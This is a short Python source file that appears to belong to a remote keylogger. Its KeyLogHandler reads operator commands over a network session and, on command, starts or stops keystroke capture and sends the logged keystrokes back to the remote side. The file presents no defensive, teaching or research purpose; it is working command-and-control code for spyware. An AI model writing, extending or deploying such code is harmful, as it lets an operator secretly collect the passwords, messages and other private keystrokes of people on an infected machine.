import json


class KeyLogHandler:
    def __init__(self, keylog_service):
        self.keylog_service = keylog_service

    def handle(self, session):
        while True:
            signal = session.read_line()
            
            if signal == "PRINT":
                keylogs = self.keylog_service.get_keylogs()
                data = keylogs.encode("utf-8")
                
                session.send(len(data).to_bytes(4, "big"))
                session.send(data)
            elif signal == "HOOK":
                self.keylog_service.hook()
            elif signal == "UNHOOK":
                self.keylog_service.unhook()
            elif signal == "CLEAR":
                self.keylog_service.clear()
                keylogs = self.keylog_service.get_keylogs()
                data = keylogs.encode("utf-8")

                
                session.send(len(data).to_bytes(4, "big"))
                session.send(data)
            elif signal == "QUIT":
                return
            